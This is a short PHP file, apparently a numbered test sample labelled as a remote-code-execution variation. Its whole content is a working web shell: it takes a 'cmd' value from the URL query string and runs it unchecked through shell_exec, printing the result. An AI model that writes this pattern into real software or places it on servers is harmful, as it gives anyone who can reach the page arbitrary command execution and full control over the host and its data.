<?php
// RCE test variation #938
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>